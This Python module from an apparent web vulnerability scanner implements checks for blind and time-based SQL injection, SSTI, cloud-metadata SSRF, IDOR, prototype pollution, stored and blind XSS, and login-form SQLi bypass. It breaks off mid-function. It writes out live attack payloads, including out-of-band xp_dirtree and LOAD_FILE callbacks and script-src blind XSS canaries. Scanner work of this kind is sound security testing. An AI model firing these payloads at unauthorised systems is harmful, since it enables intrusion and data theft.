"""Advanced checks: blind SQLi, SSTI, SSRF, IDOR, stored XSS, upload bypass.

Active POST probes only run with --deep and always use harmless content.
Blind XSS stays silent unless --blind-callback points at your listener.
"""

from __future__ import annotations

import re
import time
from urllib.parse import urlparse, parse_qs

from core.colors import info, warn, DIM, RESET
from core.scanner import (
    Finding, _get, _post, _inject, _raw_reflected, SQL_ERRORS, UPLOAD_PATHS, FILE_INPUT_HINT,
    FORM_RE, ACTION_RE, INPUT_RE, _post_form_targets,
)
from core.xss_context import classify_reflection
from core.net import ScanBudgetExceeded
from core.registry import check as register_check

TEXTAREA_RE = re.compile(r'<textarea[^>]*name=["\']([^"\']+)["\']', re.I)
# Field-type capture (so canaries never land in password/hidden/file fields)
INPUT_TYPE_RE = re.compile(
    r'<input[^>]*type=["\']?(\w+)["\']?[^>]*name=["\']([^"\']+)["\']', re.I)
INPUT_TYPE_RE2 = re.compile(
    r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']?(\w+)["\']?', re.I)
_METHOD_RE = re.compile(r'method=["\']([^"\']*)["\']', re.I)
# Fields a canary must never touch (state changes / token clobbering risk)
UNFUZZABLE_TYPES = {"password", "hidden", "file", "submit", "button",
                    "image", "checkbox", "radio"}

# WAF-bypass encodings (the wrapper changes, not the payload itself)
def encoded_variants(payload: str) -> list[str]:
    from urllib.parse import quote
    return list(dict.fromkeys([
        payload,
        quote(payload, safe=""),          # tek URL-encode: ' -> %27
    ]))

# Blind boolean payload pairs: (true, false)
BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
]

# Time-based: one payload per engine, short sleep (stay fast)
TIME_PAYLOADS = ["' OR SLEEP(3)-- -", "';SELECT pg_sleep(3)--",
                 "';WAITFOR DELAY '0:0:3'--"]
TIME_SLEEP = 3.0

SSTI_PAIR = (7719, 7919)  # product computed live (kills FPs)
# polyglot bundles: 2 engines per request (for speed)
SSTI_BUNDLES = ["{{A*B}}${A*B}", "#{A*B}<%= A*B %>", "__${A*B}__[*{A*B}]"]

SSRF_KEYS = {"url", "uri", "redirect", "next", "callback", "webhook",
             "feed", "file", "path", "dest", "domain", "host",
             "continue", "return", "link", "src"}
SSRF_META_URL = "http://169.254.169.254/latest/meta-data/ami-id"
SSRF_MARKERS = ["ami-", "instance-id", "meta-data", "computeMetadata",
                "metadata.google.internal", "placement/availability-zone"]
# Azure IMDS needs the Metadata header, otherwise it 400s even when reachable.
AZURE_META_URL = ("http://169.254.169.254/metadata/instance"
                  "?api-version=2021-02-01")
AZURE_MARKERS = ["azenvironment", '"compute"', "az environment"]
# GCP needs Metadata-Flavor and returns a bare numeric instance id.
GCP_META_URL = "http://metadata.google.internal/computeMetadata/v1/instance/id"

IDOR_RE = re.compile(r"(/api/[\w\-/]*?/)(\d+)([/?#]|$)", re.I)
# Only identifier-like names are tested (paging params
# like page/limit/year are filtered out).
IDOR_PARAM_RE = re.compile(r"(^id$|_id$|^user_?id$|uuid|guid$)", re.I)


def _bodies_differ(b1: str | None, b2: str | None) -> bool:
    """True only if two bodies differ beyond the IDs themselves.

    Length alone is weak evidence (two public product pages always differ).
    The digit-normalized similarity must also drop — otherwise the only
    difference is the echoed id, which proves nothing.
    Delegates to the shared differential engine (no local thresholds).
    """
    from core.diff import bodies_differ
    return bodies_differ(b1, b2)

PP_PAYLOADS = ["__proto__[gashpp]=1", "constructor[prototype][gashpp]=1"]

UPLOAD_BYPASS_NAMES = [
    "gash_probe.txt",        # control: is the endpoint alive?
    "gash_probe.php",        # control: plain php accepted? (direct critical)
    "gash_probe.phtml",      # alternate PHP handler
    "gash_probe.php5",       # legacy handler
    "gash_probe.png.php",    # double extension
    "gash_probe.svg",        # script-carrying image (stored XSS proof)
]
UPLOAD_OK_HINT = re.compile(r"upload|success|\bok\b|done|saved|file", re.I)
UPLOAD_BLOCK_HINT = re.compile(r"block|forbidden|not allowed|invalid|denied|error", re.I)

# Tech fingerprint -> nokta-atisi ek yollar
SMART_PATHS = {
    "node": ["package.json", "yarn.lock", ".env", "server.js", "app.js", ".npmrc"],
    "php": [".git/config", "wp-config.php.bak", ".env", "composer.json",
            "config.php.bak", "index.php.bak", "index.php.old"],
    "java": ["WEB-INF/web.xml", "actuator/env", "actuator/health", ".env"],
    "python": [".env", "settings.py.bak", "requirements.txt", "config.py.bak"],
    "wordpress": ["wp-config.php.bak", "wp-content/debug.log", ".env", "license.txt"],
    "nextjs": ["package.json", ".env", ".env.local"],
    "backup": ["backup.zip", "www.zip", "site.zip", "db.sql", "dump.sql",
               "backup.tar.gz", "old.zip", "test.zip"],
}
TECH_MARKERS = [
    ("wordpress", ["wp-content", "wp-includes", "wp-json"]),
    ("nextjs", ["_next/static", "__NEXT_DATA__"]),
    ("node", ["express", "x-powered-by: express"]),
    ("php", ["x-powered-by: php", "phpsessid", "wordpress"]),
    ("java", ["jsessionid", "x-powered-by: servlet", "spring", "actuator"]),
    ("python", ["csrftoken", "django", "wsgi", "flask"]),
]


# ---------- yardimci ----------

def _param_names(url: str) -> list[str]:
    try:
        return list(parse_qs(urlparse(url).query, keep_blank_values=True).keys())
    except Exception:
        return []


def _forms(html: str, base: str) -> list[dict]:
    """[{action, method, inputs, fields}] — en fazla 6 form."""
    from urllib.parse import urljoin
    out = []
    for m in FORM_RE.finditer(html or ""):
        chunk, full = m.group(1), m.group(0)
        am = ACTION_RE.search(full)
        mm = _METHOD_RE.search(full)
        action = urljoin(base + "/", (am.group(1) if am else "") or "/")
        inputs = INPUT_RE.findall(chunk) + TEXTAREA_RE.findall(chunk)
        fields: dict[str, str] = {}
        for t, n in INPUT_TYPE_RE.findall(chunk):
            fields.setdefault(n, (t or "text").lower())
        for n, t in INPUT_TYPE_RE2.findall(chunk):
            fields.setdefault(n, (t or "text").lower())
        for n in TEXTAREA_RE.findall(chunk):
            fields.setdefault(n, "textarea")
        for n in inputs:
            fields.setdefault(n, "text")
        out.append({"action": action,
                    "method": (mm.group(1).upper() if mm else "GET"),
                    "inputs": inputs or ["q"],
                    "fields": fields})
        if len(out) >= 6:
            break
    return out


def _method_re():
    return _METHOD_RE


# ---------- 1. advanced SQLi ----------

@register_check("sqli-blind", "Boolean-blind + encoding bypass + time-based", order=10)
def test_sqli_blind(session, urls: list[str], timeout: int,
                    verbose: bool = False, deep: bool = True,
                    threads: int = 10, oob=None) -> list[Finding]:
    """Boolean-blind differential + encoding WAF-bypass. Time-based in deep."""
    from concurrent.futures import ThreadPoolExecutor
    out: list[Finding] = []

    def _probe(u: str) -> list[Finding]:
        found: list[Finding] = []
        base_got = _get(session, u, timeout)
        if not base_got:
            return found
        base_status, base_body, _ = base_got  # _get -> (status, text, url)
        base_low = (base_body or "").lower()
        if any(e in base_low for e in SQL_ERRORS):
            return found  # error-based already caught it, don't repeat

        # -- boolean differential: TRUE ~= baseline, FALSE != baseline
        # statuses must match (else a WAF/filter is mangling things)
        for true_p, false_p in BOOLEAN_PAIRS:
            gt = _get(session, _inject(u, true_p), timeout)
            gf = _get(session, _inject(u, false_p), timeout)
            if not gt or not gf:
                continue
            gt_status, gt_body, _ = gt
            gf_status, gf_body, _ = gf
            if gt_status != base_status or gf_status != base_status:
                continue  # filter/WAF active, signal unusable
            lt, lf = len(gt_body or ""), len(gf_body or "")
            lb = len(base_body or "")
            true_same = abs(lt - lb) <= max(30, lb // 20)
            false_diff = abs(lf - lb) > max(10, lb // 10)
            # TRUE and FALSE must also differ from each other (else it's echo)
            tf_diff = abs(lt - lf) > max(10, lb // 10)
            if true_same and false_diff and tf_diff:
                # stability re-check: ask FALSE once more
                gf2 = _get(session, _inject(u, false_p), timeout)
                if not gf2 or abs(len(gf2[1] or "") - lf) > max(30, lf // 20):
                    continue
                found.append(Finding(
                    title="Possible Blind SQL Injection (boolean)", severity="CRITICAL",
                    url=u,
                    detail=f"TRUE matches baseline ({lt}B), FALSE differs ({lf}B)",
                    evidence="TRUE vs FALSE delta",
                    confidence="Medium",))
                if verbose:
                    print(warn(f"    [!] Blind SQLi: {u}"))
                break
        if found:
            return found

        # -- UNION column-count differential: ORDER BY 1 is valid SQL, while
        # ORDER BY 100 errors out unless the query has 100+ columns. A status
        # flip (or a big body change with the valid one matching baseline)
        # means the sort clause reached the database.
        gv = _get(session, _inject(u, " ORDER BY 1-- -"), timeout)
        gb = _get(session, _inject(u, " ORDER BY 100-- -"), timeout)
        if gv and gb:
            vs, vb = gv[0], len(gv[1] or "")
            bs, bb = gb[0], len(gb[1] or "")
            lb = len(base_body or "")
            valid_same = vs == base_status and abs(vb - lb) <= max(30, lb // 20)
            big_differs = (bs != vs) or (abs(bb - vb) > max(100, vb // 10))
            if valid_same and big_differs:
                found.append(Finding(
                    title="Possible SQL Injection (ORDER BY differential)",
                    severity="CRITICAL",
                    url=_inject(u, " ORDER BY 100-- -"),
                    detail=f"ORDER BY 1 matches baseline ({vs}/{vb}B) but "
                           f"ORDER BY 100 diverges ({bs}/{bb}B)",
                    evidence=f"{vs}/{vb}B vs {bs}/{bb}B",
                    confidence="Medium",))
                if verbose:
                    print(warn(f"    [!] SQLi ORDER BY: {u}"))
                return found
        if found:
            return found

        # -- encoding WAF-bypass: raw ' is clean but encoded fires
        for enc in encoded_variants("'"):
            got = _get(session, _inject(u, enc), timeout)
            if not got:
                continue
            hit = next((e for e in SQL_ERRORS if e in (got[1] or "").lower()), None)
            if hit:
                found.append(Finding(
                    title="Possible SQLi WAF Bypass (encoding)", severity="CRITICAL",
                    url=_inject(u, enc),
                    detail=f"Encoded payload returned a DB error: '{hit}'",
                    evidence=hit,
                    confidence="Medium",))
                if verbose:
                    print(warn(f"    [!] SQLi bypass: {u}"))
                break
        return found

    targets = urls[:6]
    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(targets) or 1))) as ex:
        for fs in ex.map(_probe, targets):
            out += fs

    # -- time-based: slow, deep mode + first 5 URLs (SEQUENTIAL requests: no
    # thread-pool load of our own to mistake for a signal)
    if deep:
        def _tprobe(u: str) -> Finding | None:
            t0 = time.time()
            base_got = _get(session, u, timeout + 5)
            base_dt1 = time.time() - t0
            t0 = time.time()
            base_got2 = _get(session, u, timeout + 5)
            base_dt2 = time.time() - t0
            if not base_got or not base_got2:
                return None
            base_max = max(base_dt1, base_dt2)
            if base_max > 2.0:
                return None  # already-slow site, timing is unreliable
            for p in TIME_PAYLOADS:  # MySQL SLEEP + pg_sleep + MSSQL WAITFOR
                inj = _inject(u, p)
                t1 = time.time()
                got = _get(session, inj, timeout + 5)
                dt = time.time() - t1
                if not (got and dt >= TIME_SLEEP - 0.5
                        and dt > base_max + 2.0):
                    continue
                # 2nd data point: confirmation run (rules out net jitter)
                t2 = time.time()
                got2 = _get(session, inj, timeout + 5)
                dt2 = time.time() - t2
                if got2 and dt2 >= TIME_SLEEP - 0.5 and dt2 > base_max + 2.0:
                    if verbose:
                        print(warn(f"    [!] Time-based SQLi: {u} ({dt:.1f}s + {dt2:.1f}s)"))
                    return Finding(
                        title="Possible Time-Based Blind SQLi", severity="CRITICAL",
                        url=inj,
                        detail=f"Response slow on 2 measurements ({dt:.1f}s, {dt2:.1f}s; "
                               f"baseline: {base_dt1:.1f}s/{base_dt2:.1f}s)",
                        evidence=f"sleep({TIME_SLEEP})x2",
                        confidence="Medium",)
            return None

        from core.spinner import spin
        with spin("  [*] Time-based probes (each sleeps seconds)...",
                  enabled=not verbose):
            for u in urls[:5]:
                f = _tprobe(u)
                if f:
                    out.append(f)

    # -- OOB SQLi: fire-and-forget DNS exfiltration, proven by callback.
    # MySQL UNC needs a Windows host + FILE privilege; MSSQL xp_dirtree
    # needs stacked queries. Both conditional — silence on a miss.
    if oob is not None and deep:
        from core.oob import new_token
        for u in urls[:3]:
            token = new_token()
            host = f"{token}.{oob.session_domain}"
            payloads = [
                "' AND (SELECT LOAD_FILE(CONCAT(CHAR(92,92),"
                f"'{host}',CHAR(92,120))))-- -",
                f"';EXEC master..xp_dirtree '//{host}/x'--",
            ]
            placed = False
            for payload in payloads:
                try:
                    placed = _get(session, _inject(u, payload),
                                  timeout) is not None
                except ScanBudgetExceeded:
                    raise
                except Exception:
                    pass
                if placed:
                    break
            if placed:
                oob.pending.append({"kind": "sqli", "target": u,
                                    "token": token})
    return out


# ---------- 2. SSTI ----------

@register_check("ssti", "SSTI template injection", order=10)
def test_ssti(session, urls: list[str], timeout: int,
             verbose: bool = False, threads: int = 10,
             pages: dict | None = None, base: str = "",
             deep: bool = True) -> list[Finding]:
    a, b = SSTI_PAIR
    expected = str(a * b)
    from concurrent.futures import ThreadPoolExecutor
    out: list[Finding] = []

    def _probe(u: str) -> Finding | None:
        base_got = _get(session, u, timeout)
        if not base_got or expected in (base_got[1] or ""):
            return None  # already in baseline, would be an FP
        for bundle in SSTI_BUNDLES:
            payload = bundle.replace("A", str(a)).replace("B", str(b))
            inj = _inject(u, payload)
            got = _get(session, inj, timeout)
            if got and expected in (got[1] or ""):
                # stability: one-off template echoes happen, ask again
                confirm = _get(session, inj, timeout)
                if not (confirm and expected in (confirm[1] or "")):
                    continue
                if verbose:
                    print(warn(f"    [!] SSTI: {inj}"))
                return Finding(
                    title="Possible SSTI (Template Injection)", severity="CRITICAL",
                    url=inj,
                    detail=f"Template expression evaluated to {expected}",
                    evidence=expected,
                    confidence="High",)
        return None

    targets = urls[:6]
    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(targets) or 1))) as ex:
        for f in ex.map(_probe, targets):
            if f:
                out.append(f)

    if deep:
        for action, field, filler in _post_form_targets(pages, base):
            base_r = _post(session, action, timeout,
                           data={**filler, field: "gash1"})
            if base_r and expected in (base_r.text or ""):
                continue
            for bundle in SSTI_BUNDLES:
                payload = bundle.replace("A", str(a)).replace("B", str(b))
                r = _post(session, action, timeout,
                          data={**filler, field: payload})
                if not r or expected not in (r.text or ""):
                    continue
                confirm = _post(session, action, timeout,
                                data={**filler, field: payload})
                if not (confirm and expected in (confirm.text or "")):
                    continue
                if verbose:
                    print(warn(f"    [!] SSTI (POST {field}): {action}"))
                out.append(Finding(
                    title="Possible SSTI (Template Injection)", severity="CRITICAL",
                    url=action,
                    detail=f"Template expression evaluated to {expected} via POST body",
                    evidence=expected,
                    confidence="High",))
                break
            if len(out) >= 6:
                break
    return out


# ---------- 3. SSRF ----------

@register_check("ssrf", "SSRF cloud metadata (+verbose surface note)", order=10)
def test_ssrf(session, urls: list[str], timeout: int,
              verbose: bool = False, threads: int = 10,
              oob=None) -> list[Finding]:
    from concurrent.futures import ThreadPoolExecutor
    from urllib.parse import urlencode, urlunparse
    out: list[Finding] = []

    def _probe(u: str) -> list[Finding]:
        found: list[Finding] = []
        keys = [k for k in _param_names(u) if k.lower() in SSRF_KEYS]
        if not keys:
            return found
        # OOB first: one fire-and-forget fetch per URL. The response is
        # irrelevant — only a callback proves the server went out.
        if oob is not None:
            from core.oob import new_token
            key = keys[0]
            token = new_token()
            p = urlparse(u)
            inj = urlunparse((p.scheme, p.netloc, p.path, p.params,
                              urlencode({key: oob.url_for(token)}), p.fragment))
            try:
                placed = _get(session, inj, timeout) is not None
            except ScanBudgetExceeded:
                raise
            except Exception:
                placed = False
            if placed:
                oob.pending.append({"kind": "ssrf", "target": u, "token": token})
        # baseline: a page that always mentions cloud markers (e.g. AWS docs)
        # would fake a hit on every probe — rule that out first.
        base_got = _get(session, u, timeout)
        base_low = ((base_got[1] if base_got else "") or "").lower()
        base_has_marker = any(m in base_low for m in SSRF_MARKERS + AZURE_MARKERS)
        for key in keys[:2]:
            p = urlparse(u)
            inj = urlunparse((p.scheme, p.netloc, p.path, p.params,
                              urlencode({key: SSRF_META_URL}), p.fragment))
            got = _get(session, inj, timeout)
            if not got:
                continue
            low = (got[1] or "").lower()
            hit = next((m for m in SSRF_MARKERS if m in low), None)
            if hit and not base_has_marker:
                found.append(Finding(
                    title="Possible SSRF (cloud metadata)", severity="CRITICAL",
                    url=inj,
                    detail=f"Parameter '{key}' returned a metadata marker: '{hit}'",
                    evidence=hit,
                    confidence="High",))
                if verbose:
                    print(warn(f"    [!] SSRF: {inj}"))
                continue
            az_inj = urlunparse((p.scheme, p.netloc, p.path, p.params,
                                 urlencode({key: AZURE_META_URL}), p.fragment))
            az = _get(session, az_inj, timeout, headers={"Metadata": "true"})
            if az:
                az_low = (az[1] or "").lower()
                az_hit = next((m for m in AZURE_MARKERS if m in az_low), None)
                if az_hit and not base_has_marker:
                    found.append(Finding(
                        title="Possible SSRF (cloud metadata)", severity="CRITICAL",
                        url=az_inj,
                        detail=f"Parameter '{key}' returned an Azure metadata "
                               f"marker: '{az_hit}'",
                        evidence=az_hit,
                        confidence="High",))
                    if verbose:
                        print(warn(f"    [!] SSRF (Azure): {az_inj}"))
                    continue
            gcp_inj = urlunparse((p.scheme, p.netloc, p.path, p.params,
                                  urlencode({key: GCP_META_URL}), p.fragment))
            gcp = _get(session, gcp_inj, timeout,
                       headers={"Metadata-Flavor": "Google"})
            if gcp and gcp[0] == 200:
                gcp_body = (gcp[1] or "").strip()
                if re.fullmatch(r"\d{4,}", gcp_body) \
                        and gcp_body not in (base_got[1] or ""):
                    found.append(Finding(
                        title="Possible SSRF (cloud metadata)", severity="CRITICAL",
                        url=gcp_inj,
                        detail=f"Parameter '{key}' returned a GCP instance id",
                        evidence=gcp_body[:20],
                        confidence="High",))
                    if verbose:
                        print(warn(f"    [!] SSRF (GCP): {gcp_inj}"))
                    continue
            found.append(("INFO", u, key))  # capped below at 3
        return found

    info_left = 3
    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(urls[:10]) or 1))) as ex:
        for fs in ex.map(_probe, urls[:10]):
            for x in fs:
                if isinstance(x, tuple):
                    # Signal-free "surface" notes are noise: verbose only, max 3.
                    if verbose and info_left > 0:
                        _, u, key = x
                        out.append(Finding(
                            title="SSRF surface (manual testing advised)", severity="INFO",
                            url=u,
                            detail=f"Parameter '{key}' may accept a URL",
                            evidence=key,
                            confidence="Low",))
                        info_left -= 1
                else:
                    out.append(x)
    return out


# ---------- 4. IDOR / BOLA ----------

@register_check("idor", "IDOR/BOLA API object differential", order=10)
def test_idor(session, pages: dict, base: str, timeout: int,
              verbose: bool = False, session_b=None) -> list[Finding]:
    from urllib.parse import urljoin
    from core.authz import extract_refs_from_url, sibling_url
    cands = []
    for html in (pages or {}).values():
        for m in re.findall(r'href=["\']([^"\']+)["\']', html or "", re.I):
            full = urljoin(base + "/", m)
            try:
                same = urlparse(full).hostname == urlparse(base).hostname
            except Exception:
                same = False
            if not same:
                continue
            for ref in extract_refs_from_url(full):
                # enumerable path ints under API routes only (page/2 style
                # pagination elsewhere is not an object reference).
                if ref.kind == "int" and ref.location == "path" \
                        and "/api/" in (urlparse(full).path or ""):
                    cands.append((full, ref))
    out: list[Finding] = []
    for full, ref in list(dict.fromkeys(cands))[:5]:
        sib = sibling_url(full, ref)
        if not sib:
            continue
        g1, g2 = _get(session, full, timeout), _get(session, sib, timeout)
        if not g1 or not g2:
            continue
        if g1[0] in (401, 403) or g2[0] in (401, 403):
            continue  # auth in play, not a signal
        if g1[0] == 200 and g2[0] == 200:
            l1, l2 = len(g1[1] or ""), len(g2[1] or "")
            if _bodies_differ(g1[1], g2[1]):
                try:
                    new_id = sib.rsplit("/", 1)[-1].split("?")[0][:12]
                except Exception:
                    new_id = "N+1"
                if _cross_session_confirm(session_b, sib, g2[1], timeout):
                    out.append(Finding(
                        title="Confirmed IDOR / BOLA (cross-session)",
                        severity="CRITICAL",
                        url=sib,
                        detail=f"/{ref.value} -> /{new_id} readable by a second user "
                               f"({l1}B vs {l2}B); object auth is missing",
                        evidence=f"{l1}B vs {l2}B",
                        confidence="High",
                        method="GET", param=ref.value, location="path",
                        confirm="cross-session",))
                    if verbose:
                        print(warn(f"    [!] IDOR confirmed: {sib}"))
                    continue
                out.append(Finding(
                    title="Possible IDOR / BOLA (single session)", severity="MEDIUM",
                    url=sib,
                    detail=f"/{ref.value} -> /{new_id} returned different data ({l1}B vs {l2}B), no auth; "
                           "measured in one session, confirm with two users",
                    evidence=f"{l1}B vs {l2}B",
                    confidence="Low",))
                if verbose:
                    print(warn(f"    [!] IDOR: {sib}"))
    return out


def _cross_session_confirm(session_b, sib: str, sib_body: str | None,
                           timeout: int) -> bool:
    """Does a second user see the same object? True = access control missing.

    Canonical-JSON-first comparison (keys/values/ownership exact),
    legacy length rule as the HTML fallback. A 401/403/login for user B
    means the object IS protected — that keeps the single-session
    heuristic untouched instead of upgrading it.
    """
    from core.authz import same_object
    if session_b is None:
        return False
    g = _get(session_b, sib, timeout)
    if not g or g[0] != 200:
        return False
    if not (g[1] or "").strip() and not (sib_body or "").strip():
        return False
    return same_object(g[1], sib_body)


# ---------- 5. Prototype Pollution surface ----------

@register_check("protopollution", "Prototype Pollution reflection surface", order=10)
def test_proto_pollution(session, urls: list[str], timeout: int,
                         verbose: bool = False, threads: int = 10) -> list[Finding]:
    from concurrent.futures import ThreadPoolExecutor
    out: list[Finding] = []

    def _probe(u: str) -> Finding | None:
        for p in PP_PAYLOADS:
            got = _get(session, _inject(u, p), timeout)
            if got and _raw_reflected(got[1], "gashpp"):
                if verbose:
                    print(warn(f"    [!] ProtoPollution surface: {u}"))
                return Finding(
                    title="Prototype Pollution Reflection Surface", severity="INFO",
                    url=_inject(u, p),
                    detail=f"'{p}' reflected in the response (verify manually on Node.js targets)",
                    evidence="gashpp",
                    confidence="Low",)
        return None

    targets = urls[:6]
    with ThreadPoolExecutor(max_workers=max(1, min(threads, len(targets) or 1))) as ex:
        for f in ex.map(_probe, targets):
            if f:
                out.append(f)
                if len(out) >= 2:
                    break
    return out


# ---------- 6. Stored + Blind XSS ----------

@register_check("stored-xss", "Stored XSS canary + second-order render check", order=10)
def test_stored_xss(session, pages: dict, base: str, timeout: int,
                    verbose: bool = False, deep: bool = True,
                    blind_callback: str | None = None,
                    oob=None) -> list[Finding]:
    """GET formlari her zaman; POST formlar deep modda. Benign canary.

    P1: persistence != XSS. Field-unique canary placed, render locations
    scanned (action + crawled pages = second-order), then a breaker probe
    decides: persistence-only -> LOW unconfirmed; breaker raw in render
    context -> Possible Stored XSS (browser proof arrives in P2).
    """
    forms = []
    for purl, html in (pages or {}).items():
        for f in _forms(html, purl.rsplit("/", 1)[0] if "/" in purl else base):
            f["_page"] = purl
            forms.append(f)
    forms = forms[:8]
    if not forms:
        return []
    canary_base = f"gashstored{int(time.time()) % 100000}"
    out: list[Finding] = []
    for f in forms:
        fields = f.get("fields", {})
        # Never write canaries into password forms: password-change risk plus
        # useless measurement (login/register forms get sqli-login instead).
        if (any(t == "password" for t in fields.values())
                or any("pass" in (n or "").lower() for n in f["inputs"])):
            if verbose:
                print(warn(f"    [-] Stored skipped (password form): {f['action']}"))
            continue
        fuzzable = [n for n in f["inputs"][:4]
                    if fields.get(n, "text") not in UNFUZZABLE_TYPES]
        if not fuzzable:
            continue
        # field-unique canaries: persistence tells us WHICH input renders WHERE
        canaries = {n: f"{canary_base}_{re.sub(r'[^a-z0-9]', '', (n or '').lower())[:12] or 'f'}"
                    for n in fuzzable}
        data = dict(canaries)
        try:
            if f["method"] == "POST":
                if not deep:
                    continue
                _post(session, f["action"], timeout, data=data)
            else:
                from urllib.parse import urlencode
                sep = "&" if "?" in f["action"] else "?"
                _get(session, f["action"] + sep + urlencode(data), timeout)
        except ScanBudgetExceeded:
            raise
        except Exception:
            continue
        # persistence: re-fetch the action page + crawled pages
        # (cache-buster, so proxies/caches can't serve a stale copy).
        # Other render URLs = second-order: input at A, output at B.
        import random
        cb = f"gashcb={random.randint(10000, 99999)}"
        checks = list(dict.fromkeys([f["action"]] + list((pages or {}).keys())[:8]))
        checks = [c + ("&" if "?" in c else "?") + cb for c in checks]
        hits: list[tuple[str, str, str]] = []  # (render_url, field, body)
        for check in checks:
            got = _get(session, check, timeout)
            if not got:
                continue
            body = got[1] or ""
            for field, canary in canaries.items():
                if canary in body:
                    hits.append((check, field, body))
                    break
        if hits:
            render_url, hit_field, _ = hits[0]
            probe_canary = canaries[hit_field]
            probe_payload = f'{probe_canary}"><svg onload=alert(1)>'
            probe_data = dict(canaries)
            probe_data[hit_field] = probe_payload
            try:
                if f["method"] == "POST":
                    _post(session, f["action"], timeout, data=probe_data)
                else:
                    from urllib.parse import urlencode
                    sep = "&" if "?" in f["action"] else "?"
                    _get(session, f["action"] + sep + urlencode(probe_data),
                         timeout)
            except ScanBudgetExceeded:
                raise
            except Exception:
                pass
            confirmed: dict | None = None
            confirmed_at = ""
            loc = "body" if f["method"] == "POST" else "query"
            for recheck in [render_url] + [c for c, _, _ in hits[1:3]]:
                got2 = _get(session, recheck, timeout)
                if not got2:
                    continue
                v = classify_reflection(got2[1], probe_canary, probe_payload)
                if v["status"] == "breakout":
                    confirmed, confirmed_at = v, recheck
                    break
            if confirmed is not None:
                out.append(Finding(
                    title="Possible Stored XSS", severity="MEDIUM",
                    url=f["action"],
                    detail=f"Canary for field '{hit_field}' persists and "
                           f"breaker survives raw in '{confirmed['context']}' "
                           f"context at {confirmed_at} "
                           f"({confirmed['evidence']})",
                    evidence=probe_canary,
                    confidence="Medium",
                    method=f["method"], param=hit_field, location=loc,
                    confirm="breakout",))
                if verbose:
                    print(warn(f"    [!] Stored XSS (breakout): {f['action']}"))
            else:
                out.append(Finding(
                    title="Stored reflection (unconfirmed)", severity="LOW",
                    url=f["action"],
                    detail=f"Canary for field '{hit_field}' persists at "
                           f"{render_url} but breaker chars were not "
                           "observed; not proven executable",
                    evidence=probe_canary,
                    confidence="Low",
                    method=f["method"], param=hit_field, location=loc,))
                if verbose:
                    print(warn(f"    [-] Stored reflection: {f['action']}"))
        if (blind_callback or oob is not None) and sum(
                1 for x in out if x.title.startswith("Blind XSS canary")) < 2:
            # Blind XSS: only place a real canary when someone listens.
            # OOB auto-verifies via drain (no note here); a manual listener
            # gets one LOW note pointing at it. No listener, no noise.
            if oob is not None:
                from core.oob import new_token
                token = new_token()
                blind = f"\"><script src={oob.url_for(token)}>"
            else:
                host = blind_callback.strip().rstrip("/").split("/")[-1]
                token = f"gashblind{int(time.time()) % 100000}"
                blind = f"\"><script src=https://{host}/{token}.js>"
            blind_data = {i: blind for i in fuzzable}
            placed = False
            try:
                if f["method"] == "POST":
                    if deep:
                        placed = _post(session, f["action"], timeout,
                                       data=blind_data) is not None
                    else:
                        continue
                else:
                    from urllib.parse import urlencode
                    sep = "&" if "?" in f["action"] else "?"
                    placed = _get(session, f["action"] + sep + urlencode(blind_data),
                                  timeout) is not None
            except ScanBudgetExceeded:
                raise
            except Exception:
                pass
            if oob is not None:
                if placed:
                    oob.pending.append({"kind": "xss", "target": f["action"],
                                        "token": token})
                continue
            if not placed:
                continue  # degraded request: don't claim a placement
            out.append(Finding(
                title="Blind XSS canary placed (unverified)",
                severity="LOW",
                url=f["action"],
                detail=f"Canary '{token}' placed; watch the '{host}' listener "
                       "for a trigger (unverified)",
                evidence=token,
                confidence="Low",))
    # dedupe repeat hits on the same action
    seen, uniq = set(), []
    for x in out:
        if (x.title, x.url) not in seen:
            seen.add((x.title, x.url))
            uniq.append(x)
    return uniq[:4]


# ---------- 9. Login form SQLi (auth bypass differential) ----------

LOGIN_PAYLOADS = ["admin' OR '1'='1", "' OR '1'='1' -- "]
LOGIN_OK = ["logout", "log out", "sign out", "welcome", "account history",
            "dashboard", "my account", "myaccount", "members area"]
LOGIN_INPUT_RE = re.compile(
    r'<input[^>]*type=["\']?(\w+)["\']?[^>]*name=["\']([^"\']+)["\']', re.I)
LOGIN_INPUT_RE2 = re.compile(
    r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']?(\w+)["\']?', re.I)

LOGIN_USER_HINTS = ["invalid username", "unknown user", "user not found",
                    "no such user", "username does not exist",
                    "account does not exist"]
LOGIN_PASS_HINTS = ["invalid password", "wrong password",
                    "incorrect password"]


def _login_fields(chunk: str) -> tuple[dict[str, str], dict[str, str]]:
    """Parse a login form chunk -> (fields name->type, hidden name->value)."""
    fields: dict[str, str] = {}
    for mm2 in list(LOGIN_INPUT_RE.finditer(chunk)) + \
               [(b, a) for a, b in LOGIN_INPUT_RE2.findall(chunk)]:
        t, n = mm2 if isinstance(mm2, tuple) else (mm2.group(1), mm2.group(2))
        fields[n] = (t or "text").lower()
    hidden_vals: dict[str, str] = {}
    for hm in re.finditer(
            r'<input[^>]*type=["\']?hidden["\']?[^>]*>', chunk, re.I):
        tag = hm.group(0)
        nm = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        vm = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        if nm:
            hidden_vals[nm.group(1)] = vm.group(1) if vm else ""
    return fields, hidden_vals


def _scrub_hidden(body: str, hidden_vals: dict[str, str]) -> str:
    """Blank rotating CSRF tokens so length comparisons stay meaningful."""
    from core.diff import scrub_tokens
    return scrub_tokens(body, (hidden_vals or {}).values())


@register_check("sqli-login", "Login form SQLi auth-bypass differential", order=10, deep_only=True)
def test_sqli_login(session, pages: dict, base: str, timeout: int,
                    verbose: bool = False) -> list[Finding]:
    """Password forms: random-user baseline (must fail) vs injection.
    A 'logged in' trace after injection means CRITICAL. Max 3 forms."""
    from urllib.parse import urljoin
    out: list[Finding] = []
    forms = []
    for purl, html in (pages or {}).items():
        for m in FORM_RE.finditer(html or ""):
            chunk, full = m.group(1), m.group(0)
            if "password" not in full.lower():
                continue
            am = ACTION_RE.search(full)
            action = urljoin(base + "/", (am.group(1) if am else "") or "/")
            mm = _method_re()
            method = (mm.search(full).group(1).upper() if mm.search(full) else "GET")
            if method != "POST":
                continue
            fields, hidden_vals = _login_fields(chunk)
            if any(t == "password" for t in fields.values()):
                forms.append({"action": action, "fields": fields,
